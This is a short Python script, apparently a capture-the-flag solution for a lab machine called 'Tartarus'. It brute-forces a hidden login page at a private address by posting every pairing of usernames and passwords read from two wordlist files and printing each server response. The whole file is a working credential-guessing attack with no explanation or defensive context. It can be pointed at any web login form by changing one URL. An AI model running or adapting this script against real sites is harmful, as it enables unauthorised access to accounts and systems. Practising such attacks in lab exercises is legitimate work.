import requests

url = 'http://10.10.60.161/sUp3r-s3cr3t/authenticate.php'
usernames = [string.strip()
             for string in open('Tartarus/userid', 'r').readlines()]
passwords = [string.strip() for string in open(
    'Tartarus/credentials.txt', 'r').readlines()]


def login(username, password):
    r = requests.post(url, data={
        'username': username,
        'password': password,
        'submit': 'Login'
    })
    return r.text


for username in usernames:
    for password in passwords:
        print('Trying credentials: ', username, ': ', password)
        print(login(username, password))
